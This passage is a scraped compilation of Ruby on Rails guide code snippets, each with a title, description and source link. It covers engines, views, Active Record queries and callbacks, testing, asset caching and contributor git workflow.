config/initializers/my_engine.rb\nMyEngine.configure do |config|\n  config.user_model = \"User\" # OK\nend\n```\n\n----------------------------------------\n\nTITLE: Updating an Existing Rails Pull Request\nDESCRIPTION: This bash snippet shows how to update an existing Rails pull request by amending the last commit and force pushing the changes to the fork.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_45\n\nLANGUAGE: bash\nCODE:\n```\n$ git commit --amend\n$ git push fork my_new_branch --force-with-lease\n```\n\n----------------------------------------\n\nTITLE: Rendering Comments in Article View (ERB)\nDESCRIPTION: Adds code to the article show view (`app/views/blorgh/articles/show.html.erb`) within the engine to display associated comments. It uses the `render` helper with the `@article.comments` collection, which requires a `has_many :comments` association on the `Blorgh::Article` model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_17\n\nLANGUAGE: html+erb\nCODE:\n```\n<h3>Comments</h3>\n<%= render @article.comments %>\n```\n\n----------------------------------------\n\nTITLE: Setting Rails Logger in Initializer Section\nDESCRIPTION: Demonstrates how to set custom loggers directly using Rails.logger in the initializer section, offering an alternative to the config approach.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nRails.logger = Logger.new(STDOUT)\nRails.logger = Log4r::Logger.new(\"Application Log\")\n```\n\n----------------------------------------\n\nTITLE: Adding to config/application.rb with environment\nDESCRIPTION: Demonstrates how to add a line inside the `Application` class for `config/application.rb` using the `environment` method. Shows how to specify an environment for the line to be appended to.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nenvironment 'config.action_mailer.default_url_options = {host: \"http://yourwebsite.example.com\"}', env: \"production\"\n```\n\n----------------------------------------\n\nTITLE: SQL Equivalent: Find Customer by ID (Single)\nDESCRIPTION: SQL query equivalent to the ActiveRecord `Customer.find(10)` call.  It selects all columns from the `customers` table where the `id` is 10 and limits the result to 1 row. This demonstrates the underlying SQL generated by Active Record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.id = 10) LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Customizing Field Error HTML with Action View\nDESCRIPTION: This snippet demonstrates customizing the HTML generated for field errors using `config.action_view.field_error_proc`. The provided block wraps the HTML tag with a `<div>` that has the class `field_with_errors`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nProc.new { |html_tag, instance| content_tag :div, html_tag, class: \"field_with_errors\" }\n```\n\n----------------------------------------\n\nTITLE: Configuring Far-Future Asset Expiration in Apache (Apache)\nDESCRIPTION: Demonstrates Apache server configuration to add far-future expiration headers for static asset delivery. This setup requires 'mod_expires' to be enabled and removes ETags while setting a 1-year cache expiry for the /assets location. Input is the configuration itself, and output is improved client-side caching for assets. Appropriate for asset directories served by Apache in production environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_13\n\nLANGUAGE: apache\nCODE:\n```\n# The Expires* directives requires the Apache module\n# `mod_expires` to be enabled.\n<Location /assets/>\n  # Use of ETag is discouraged when Last-Modified is present\n  Header unset ETag\n  FileETag None\n  # RFC says only cache for 1 year\n  ExpiresActive On\n  ExpiresDefault \"access plus 1 year\"\n</Location>\n```\n\n----------------------------------------\n\nTITLE: Engine Gemfile Integration\nDESCRIPTION: How to include the engine in a Rails application's Gemfile\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"blorgh\", path: \"engines/blorgh\"\n```\n\n----------------------------------------\n\nTITLE: Using Custom Prompts in datetime_select Helpers - Rails (Ruby)\nDESCRIPTION: Shows how to provide custom prompt options to Rails datetime_select and related helpers by passing :prompt as true, a string, or a hash for different components. Works for date_select, time_select, and datetime_select, allowing improved user instructions in select boxes. Inputs are DateTime instances and prompt options; outputs are select tag HTML; requires Rails 2.3+.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nselect_datetime(DateTime.now, :prompt => true)\\n\\nselect_datetime(DateTime.now, :prompt => \\\"Choose date and time\\\")\\n\\nselect_datetime(DateTime.now, :prompt =>\\n  {:day => 'Choose day', :month => 'Choose month',\\n   :year => 'Choose year', :hour => 'Choose hour',\\n   :minute => 'Choose minute'})\n```\n\n----------------------------------------\n\nTITLE: Observe Default Rescue Responses for Action Dispatch\nDESCRIPTION: This snippet shows the default rescue responses configured in `ActionDispatch::ExceptionWrapper.rescue_responses`. It maps various exceptions to their corresponding HTTP status codes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  \"ActionController::RoutingError\" => :not_found,\n  \"AbstractController::ActionNotFound\" => :not_found,\n  \"ActionController::MethodNotAllowed\" => :method_not_allowed,\n  \"ActionController::UnknownHttpMethod\" => :method_not_allowed,\n  \"ActionController::NotImplemented\" => :not_implemented,\n  \"ActionController::UnknownFormat\" => :not_acceptable,\n  \"ActionDispatch::Http::MimeNegotiation::InvalidType\" => :not_acceptable,\n  \"ActionController::MissingExactTemplate\" => :not_acceptable,\n  \"ActionController::InvalidAuthenticityToken\" => :unprocessable_entity,\n  \"ActionController::InvalidCrossOriginRequest\" => :unprocessable_entity,\n  \"ActionDispatch::Http::Parameters::ParseError\" => :bad_request,\n  \"ActionController::BadRequest\" => :bad_request,\n  \"ActionController::ParameterMissing\" => :bad_request,\n  \"Rack::QueryParser::ParameterTypeError\" => :bad_request,\n  \"Rack::QueryParser::InvalidParameterError\" => :bad_request,\n  \"ActiveRecord::RecordNotFound\" => :not_found,\n  \"ActiveRecord::StaleObjectError\" => :conflict,\n  \"ActiveRecord::RecordInvalid\" => :unprocessable_entity,\n  \"ActiveRecord::RecordNotSaved\" => :unprocessable_entity\n}\n```\n\n----------------------------------------\n\nTITLE: Rescuing ActiveRecord::RecordNotFound in Rails ApplicationController (Ruby)\nDESCRIPTION: This controller example demonstrates use of rescue_from in ApplicationController to handle ActiveRecord::RecordNotFound exceptions. When such an exception occurs, the record_not_found private method is called, rendering a plain text message and returning a 404 status. This is useful for customizing user-facing error behavior and should be placed in ApplicationController or its subclasses. Assumes ActionController::Base inheritance and access to render method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  rescue_from ActiveRecord::RecordNotFound, with: :record_not_found\n\n  private\n    def record_not_found\n      render plain: \"Record Not Found\", status: 404\n    end\nend\n\n```\n\n----------------------------------------\n\nTITLE: HTML Output from fields_for with index option in Rails\nDESCRIPTION: This is the resulting HTML output from the previous ERB snippet. It shows how the `:index` option in `fields_for` generates unique names for the input fields, incorporating the address IDs (23 and 45) into the `name` attribute. This allows Rails to correctly map the form inputs to the corresponding address records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_74\n\nLANGUAGE: html\nCODE:\n```\n<form accept-charset=\"UTF-8\" action=\"/people/1\" method=\"post\">\n  <input name=\"_method\" type=\"hidden\" value=\"patch\" />\n  <input id=\"person_name\" name=\"person[name]\" type=\"text\" />\n  <input id=\"person_address_23_city\" name=\"person[address][23][city]\" type=\"text\" />\n  <input id=\"person_address_45_city\" name=\"person[address][45][city]\" type=\"text\" />\n</form>\n```\n\n----------------------------------------\n\nTITLE: Extending String with to_squawk Method - Ruby Core Class Modification - Ruby\nDESCRIPTION: This snippet reopens the Ruby String class to add a 'to_squawk' method, which prepends 'squawk!' to the string's content. No external dependencies beyond Ruby itself are required, but inclusion in a Rails or Ruby app will make it available application-wide. Accepts a string, returns a modified string; has no significant constraints unless other monkey-patching conflicts exist.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/lib/yaffle/core_ext.rb\n\nclass String\n  def to_squawk\n    \"squawk! #{self}\".strip\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Wrapping a Legacy Table with a Rails-Compatible View - ActiveRecord Migration - Ruby/SQL\nDESCRIPTION: Creates a SQL view named articles that maps legacy table columns (with non-standard names) to Rails-conventional names. Performed via a raw SQL statement executed in a Rails migration. Requires the legacy table to exist; outputs an updatable view filtering only unarchived articles for easier integration with Rails models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_articles_view.rb\\nexecute <<-SQL\\nCREATE VIEW articles AS\\n  SELECT \\\"INT_ID\\\" AS id,\\n         \\\"STR_TITLE\\\" AS title,\\n         \\\"STR_STAT\\\" AS status,\\n         \\\"DT_PUBL_AT\\\" AS published_at,\\n         \\\"BL_ARCH\\\" AS archived\\n  FROM \\\"TBL_ART\\\"\\n  WHERE \\\"BL_ARCH\\\" = 'f'\\nSQL\n```\n\n----------------------------------------\n\nTITLE: Builder XML Example (Ruby)\nDESCRIPTION: This Ruby code demonstrates how to use the Builder library to generate an XML response. It shows how to create elements with attributes and nested elements. The `xml` object is automatically available within Builder templates.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\nxml.em(\"emphasized\")\nxml.em { xml.b(\"emph & bold\") }\nxml.a(\"A Link\", \"href\" => \"https://rubyonrails.org\")\nxml.target(\"name\" => \"compile\", \"option\" => \"fast\")\n```\n\n----------------------------------------\n\nTITLE: Output of Rails Model Generation\nDESCRIPTION: This code block is not code, but terminal output describing the actions taken when generating a Rails model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\n      invoke  active_record\n      create    db/migrate/20240426151900_create_products.rb\n      create    app/models/product.rb\n      invoke    test_unit\n      create      test/models/product_test.rb\n      create      test/fixtures/products.yml\n```\n\n----------------------------------------\n\nTITLE: Multiple Conditions with Proc for before_save Callback in Rails\nDESCRIPTION: Shows how to include a Proc object within an array of conditions for a `before_save` callback. The `filter_content` method is executed only if `subject_to_parental_control?` method and the lambda expression `-> { untrusted_author? }` both evaluate to true.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nclass Comment < ApplicationRecord\n  before_save :filter_content,\n    if: [:subject_to_parental_control?, -> { untrusted_author? }]\nend\n```\n\n----------------------------------------\n\nTITLE: Example of Structured Documentation with Examples Section\nDESCRIPTION: Demonstrates how to format larger documentation sections with a dedicated \"Examples\" header. Shows the proper indentation and formatting for multiple example blocks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# ==== Examples\n#\n#   Person.exists?(5)\n#   Person.exists?('5')\n#   Person.exists?(name: \"David\")\n#   Person.exists?(['name LIKE ?', \"%#{query}%\"])\n```\n\n----------------------------------------\n\nTITLE: ERB Template for Rails View\nDESCRIPTION: This ERB code snippet shows the content of a basic Rails view template, specifically `app/views/products/index.html.erb`. It displays a heading and a paragraph indicating the file's location.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_43\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Products#index</h1>\n<p>Find me in app/views/products/index.html.erb</p>\n```\n\n----------------------------------------\n\nTITLE: Action Mailbox Test Case\nDESCRIPTION: This is an example test case for an Action Mailbox. It checks if a forwarded email creates a recording and asserts the values of the recording's attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nclass ForwardsMailboxTest < ActionMailbox::TestCase\n  test \"directly recording a client forward for a forwarder and forwardee corresponding to one project\" do\n    assert_difference -> { people(:david).buckets.first.recordings.count } do\n      receive_inbound_email_from_mail \\\n        to: \"save@example.com\",\n        from: people(:david).email_address,\n        subject: \"Fwd: Status update?\",\n        body: <<~BODY\n          --- Begin forwarded message ---\n          From: Frank Holland <frank@microsoft.com>\n\n          What's the status?\n        BODY\n    end\n\n    recording = people(:david).buckets.first.recordings.last\n    assert_equal people(:david), recording.creator\n    assert_equal \"Status update?\", recording.forward.subject\n    assert_match \"What's the status?\", recording.forward.content.to_s\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using respond_with in a Ruby on Rails controller\nDESCRIPTION: This snippet demonstrates how to use respond_with and class-level respond_to in a Rails controller. It requires the responders gem in Rails 4.2.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/users_controller.rb\n\nclass UsersController < ApplicationController\n  respond_to :html, :json\n\n  def show\n    @user = User.find(params[:id])\n    respond_with @user\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Updating and Rebasing a Rails Development Branch\nDESCRIPTION: This bash snippet shows the process of updating a development branch with the latest changes from the main branch, rebasing the changes, and force pushing to GitHub.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_41\n\nLANGUAGE: bash\nCODE:\n```\n$ git checkout main\n$ git pull --rebase\n$ git checkout my_new_branch\n$ git rebase main\n$ git push --force-with-lease\n```\n\n----------------------------------------\n\nTITLE: Credential YAML Example - YAML\nDESCRIPTION: This example demonstrates the structure of the credentials.yml.enc file, showcasing how the secret_key_base is stored. The secret_key_base is used for signing the session data in CookieStore.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_36\n\nLANGUAGE: yaml\nCODE:\n```\n# aws:\n#   access_key_id: 123\n#   secret_access_key: 345\n\n# Used as the base secret for all MessageVerifiers in Rails, including the one protecting cookies.\nsecret_key_base: 492f...\n```\n\n----------------------------------------\n\nTITLE: Implementing Error Handling with Rails Error Reporter in Ruby\nDESCRIPTION: Demonstrates the use of Rails.error.handle to replace traditional begin-rescue error handling. This method reports errors to registered subscribers and swallows the error, allowing execution to continue.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nRails.error.handle(SomethingIsBroken) do\n  do_something\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying Edit and Delete Links Conditionally (Authenticated Users) - ERB\nDESCRIPTION: This code demonstrates how to conditionally render 'Edit' and 'Delete' links for a product only when a user is authenticated.  It leverages Rails' ERB templating and the `authenticated?` helper to control the visibility of these links.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_75\n\nLANGUAGE: erb\nCODE:\n```\n<h1><%= @product.name %></h1>\n\n<%= link_to \"Back\", products_path %>\n<% if authenticated? %>\n  <%= link_to \"Edit\", edit_product_path(@product) %>\n  <%= button_to \"Delete\", @product, method: :delete, data: { turbo_confirm: \"Are you sure?\" } %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: SQL Output for Encrypted Data\nDESCRIPTION: Example of how encrypted data appears in SQL queries, showing the encrypted format of stored data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nINSERT INTO `articles` (`title`) VALUES ('{\\\"p\\\":\\\"n7J0/ol+a7DRMeaE\\\",\\\"h\\\":{\\\"iv\\\":\\\"DXZMDWUKfp3bg/Yu\\\",\\\"at\\\":\\\"X1/YjMHbHD4talgF9dt61A==\\\"}}')\n```\n\n----------------------------------------\n\nTITLE: Accessing Zeitwerk Loader in Rails 6\nDESCRIPTION: This Ruby code shows how to access the Zeitwerk loader object in Rails 6, which can be useful for preloading STI classes or configuring custom inflectors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nRails.autoloaders.main\n```\n\n----------------------------------------\n\nTITLE: Handling Unresolved Instances\nDESCRIPTION: This snippet shows how to define `to_missing_attachable_partial_path` to render a different missing attachment partial when Action Text is unable to resolve the User instance (e.g., if the record has been deleted).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  def self.to_missing_attachable_partial_path\n    \"users/missing_attachable\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rewritten API URL for Released Guides - none\nDESCRIPTION: Shows the rewritten API documentation URL with an injected Rails version, detailing how the guides generator rewrites links. This is a static example, serving informational purposes for guide maintainers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_9\n\nLANGUAGE: none\nCODE:\n```\nhttps://api.rubyonrails.org/v5.1.0/classes/ActionDispatch/Response.html\n```\n\n----------------------------------------\n\nTITLE: where.not Query Generation Change\nDESCRIPTION: Illustrates how where.not now generates NAND predicates instead of NOR, changing the SQL generation behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_1_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nUser.where.not(name: \"Jon\", role: \"admin\")\n# SELECT * FROM users WHERE name != 'Jon' AND role != 'admin'\n```\n\nLANGUAGE: ruby\nCODE:\n```\nUser.where.not(name: \"Jon\", role: \"admin\")\n# SELECT * FROM users WHERE NOT (name = 'Jon' AND role = 'admin')\n```\n\n----------------------------------------\n\nTITLE: Testing Job Exceptions (Ruby)\nDESCRIPTION: This test demonstrates how to test that a job raises an exception. It calls the `perform` method directly and uses `assert_raises` to verify that the `InsufficientFundsError` is raised.  It tests `BillingJob.new(empty_account, product).perform`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_104\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass BillingJobTest < ActiveJob::TestCase\n  test \"does not charge accounts with insufficient funds\" do\n    assert_raises(InsufficientFundsError) do\n      BillingJob.new(empty_account, product).perform\n    end\n    assert_not account.reload.charged_for?(product)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Customizing Optimistic Locking Column (Ruby)\nDESCRIPTION: This snippet demonstrates how to override the default name of the `lock_version` column using the `locking_column` class attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_132\n\nLANGUAGE: ruby\nCODE:\n```\nclass Customer < ApplicationRecord\n  self.locking_column = :lock_customer_column\nend\n```\n\n----------------------------------------\n\nTITLE: Using after_commit for File Deletion in Rails\nDESCRIPTION: This code demonstrates how to use the `after_commit` callback in a Rails model to delete a file from disk after the corresponding record is destroyed. This is used to ensure that the file deletion only occurs after the database transaction has been successfully committed, preventing data inconsistencies in case of a rollback. The `:on` option is used to specify that the callback should only fire on the `:destroy` event.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nclass PictureFile < ApplicationRecord\n  after_commit :delete_picture_file_from_disk, on: :destroy\n\n  def delete_picture_file_from_disk\n    if File.exist?(filepath)\n      File.delete(filepath)\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Illustrating Overriding after_commit Callbacks with Aliases in Rails\nDESCRIPTION: This example showcases that using both `after_create_commit` and `after_update_commit` with the same method name will result in only the last defined callback taking effect.  This occurs because both aliases internally point to the same `after_commit` callback, and the second definition overrides the first.  It's recommended to use `after_save_commit` in such cases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  after_create_commit :log_user_saved_to_db\n  after_update_commit :log_user_saved_to_db\n\n  private\n    def log_user_saved_to_db\n      # This only gets called once\n      Rails.logger.info(\"User was saved to database\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Checking CDN Copy Headers with curl in Bash\nDESCRIPTION: Example of using curl to examine the headers from a CDN copy of an asset, showing additional CDN-specific headers like X-Cache. This helps verify that assets are being properly cached by the CDN.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\n$ curl -I http://mycdnsubdomain.fictional-cdn.com/application-d0e099e021c95eb0de3615fd1d8c4d83.css\nHTTP/1.1 200 OK Server: Cowboy Last-Modified: Thu, 08 May 2014 01:24:14 GMT Content-Type: text/css\nCache-Control: public, max-age=2592000\nVia: 1.1 vegur\nContent-Length: 126560\nAccept-Ranges: bytes\nDate: Sun, 24 Aug 2014 20:28:45 GMT\nVia: 1.1 varnish\nAge: 885814\nConnection: keep-alive\nX-Served-By: cache-dfw1828-DFW\nX-Cache: HIT\nX-Cache-Hits: 68\nX-Timer: S1408912125.211638212,VS0,VE0\n```\n\n----------------------------------------\n\nTITLE: Converting Numeric Durations to Milliseconds - Ruby\nDESCRIPTION: The `in_milliseconds` extension on Numeric allows conversion of durations, such as 1.hour or 5.minutes, to integer millisecond values (e.g., 1.hour.in_milliseconds => 3600000). This is useful for integrating with JavaScript APIs or other systems expecting times in milliseconds. Requires ActiveSupport core extensions loaded into Numeric. Inputs are duration-based numerics; output is an integer representing milliseconds.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_13\n\nLANGUAGE: Ruby\nCODE:\n```\n# Example: Numeric#in_milliseconds\nms = 1.hour.in_milliseconds # => 3600000\n```\n\n----------------------------------------\n\nTITLE: Updating Record with save in Rails\nDESCRIPTION: This snippet demonstrates an alternative method of updating a record: assigning attributes directly and then calling `save`. It finds a product by ID, changes its `name` attribute, and calls `save` to persist the changes to the database. It includes the database transaction and SQL update query.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_28\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product = Product.find(1)\nstore(dev)> product.name = \"T-Shirt\"\n=> \"T-Shirt\"\nstore(dev)> product.save\n  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/\n  Product Update (0.2ms)  UPDATE \"products\" SET \"name\" = 'T-Shirt', \"updated_at\" = '2024-11-09 22:39:09.693548' WHERE \"products\".\"id\" = 1 /*application='Store'*/\n  TRANSACTION (0.0ms)  COMMIT TRANSACTION /*application='Store'*/\n=> true\n```\n\n----------------------------------------\n\nTITLE: Concatenating Redirect URL Patterns to Filter in Rails Application Configuration (Ruby)\nDESCRIPTION: This snippet extends redirect URL filtering in a Rails application by concatenating an array containing both a string and a regular expression to the config.filter_redirect option. This allows simultaneous inclusion of exact string matches and pattern-based filtering for URLs, enhancing coverage for sensitive or internal paths. Make sure the config object exists and supports these options; usage is typically within config files or initializers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.filter_redirect.concat [\"s3.amazonaws.com\", /private_path/]\n\n```\n\n----------------------------------------\n\nTITLE: Logging Fragment Cache Reads/Writes in Rails\nDESCRIPTION: This configuration determines whether to log fragment cache reads and writes in a verbose format. When enabled, log entries include details about cache hits and misses, along with rendering times. The default value is `false`, which provides a less verbose output.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_46\n\nLANGUAGE: text\nCODE:\n```\nRead fragment views/v1/2914079/v1/2914079/recordings/70182313-20160225015037000000/d0bdf2974e1ef6d31685c3b392ad0b74 (0.6ms)\nRendered messages/_message.html.erb in 1.2 ms [cache hit]\nWrite fragment views/v1/2914079/v1/2914079/recordings/70182313-20160225015037000000/3b4e249ac9d168c617e32e84b99218b5 (1.1ms)\nRendered recordings/threads/_thread.html.erb in 1.5 ms [cache miss]\n```\n\nLANGUAGE: text\nCODE:\n```\nRendered messages/_message.html.erb in 1.2 ms [cache hit]\nRendered recordings/threads/_thread.html.erb in 1.5 ms [cache miss]\n```\n\n----------------------------------------\n\nTITLE: Setting a CGI Variable in Request Headers - Ruby\nDESCRIPTION: This Ruby snippet shows how to set a CGI variable within the request headers when making a GET request using `articles_url`.  It simulates a request with a custom environment variable, in this case, the HTTP_REFERER.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nget articles_url, headers: { \"HTTP_REFERER\": \"http://example.com/home\" } # simulate the request with custom env variable\n```\n\n----------------------------------------\n\nTITLE: Implementing has_many :through Association in Ruby on Rails\nDESCRIPTION: Demonstrates how to set up a many-to-many relationship using has_many :through with an intermediary Manifest model. This approach allows adding validations, callbacks, and extra attributes to the join model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nclass Assembly < ApplicationRecord\n  has_many :manifests\n  has_many :parts, through: :manifests\nend\n\nclass Manifest < ApplicationRecord\n  belongs_to :assembly\n  belongs_to :part\nend\n\nclass Part < ApplicationRecord\n  has_many :manifests\n  has_many :assemblies, through: :manifests\nend\n```\n\n----------------------------------------\n\nTITLE: Generating RDoc Documentation for Ruby Gem\nDESCRIPTION: This bash command shows how to generate RDoc documentation for a Ruby gem using Bundler.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_29\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake rdoc\n```\n\n----------------------------------------\n\nTITLE: Creating Migration for Polymorphic Association with References Shorthand\nDESCRIPTION: Demonstrates the recommended way to create a migration for a polymorphic association using t.belongs_to with polymorphic: true, which automatically adds both foreign key and type columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreatePictures < ActiveRecord::Migration[8.1]\n  def change\n    create_table :pictures do |t|\n      t.string :name\n      t.belongs_to :imageable, polymorphic: true\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Removing Sprockets-related Gems in Rails\nDESCRIPTION: This bash command removes the Sprockets-related gems from a Rails project as part of the migration to Propshaft. It uninstalls sprockets, sprockets-rails, and sass-rails gems.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_25\n\nLANGUAGE: bash\nCODE:\n```\nbundle remove sprockets\nbundle remove sprockets-rails\nbundle remove sass-rails\n```\n\n----------------------------------------\n\nTITLE: Setting Up Chain Backend for I18n\nDESCRIPTION: Shows how to replace the Simple backend with a Chain backend to combine multiple I18n backends. This example chains ActiveRecord backend with the default Simple backend.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.backend = I18n::Backend::Chain.new(I18n::Backend::ActiveRecord.new, I18n.backend)\n```\n\n----------------------------------------\n\nTITLE: Time Zone Select using form builder\nDESCRIPTION: This snippet demonstrates how to use the `time_zone_select` helper with a form builder to create a select box for choosing a time zone.  It leverages the `ActiveSupport::TimeZone` objects for pre-defined timezone options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_46\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.time_zone_select :time_zone %>\n```\n\n----------------------------------------\n\nTITLE: Accessing Route Helpers in Rails Console\nDESCRIPTION: Shows how to access route helpers within the Rails console using `Rails.application.routes.url_helpers` and the `app` object. This allows you to generate URLs and paths programmatically.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_86\n\nLANGUAGE: irb\nCODE:\n```\nirb> Rails.application.routes.url_helpers.users_path\n=> \"/users\"\n\nirb> user = User.first\n=> #<User:0x00007fc1eab81628\nirb> app.edit_user_path(user)\n=> \"/users/1/edit\"\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - human (IRB)\nDESCRIPTION: Demonstrates the `human` method of `model_name` from `ActiveModel::Naming`.  It transforms the model name into a more human format, using I18n.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_27\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.human\n=> \"Person\"\n```\n\n----------------------------------------\n\nTITLE: Subscribing to Notifications with Individual Arguments in Ruby\nDESCRIPTION: Illustrates an alternative subscription method using `ActiveSupport::Notifications.subscribe` for the `process_action.action_controller` event. The block receives five separate arguments: the event name, start time (wall-clock), finish time (wall-clock), a unique instrumenter ID, and the event payload. This can be slightly more direct if the full Event object is not needed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Notifications.subscribe \"process_action.action_controller\" do |name, started, finished, unique_id, payload|\n  # your own custom stuff\n  Rails.logger.info \"#{name} Received! (started: #{started}, finished: #{finished})\" # process_action.action_controller Received! (started: 2019-05-05 13:43:57 -0800, finished: 2019-05-05 13:43:58 -0800)\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Zeitwerk Loader Instances in Rails - Ruby\nDESCRIPTION: Shows how to access the main and once-only Zeitwerk loader instances in a running Rails application. 'Rails.autoloaders.main' returns the primary loader; 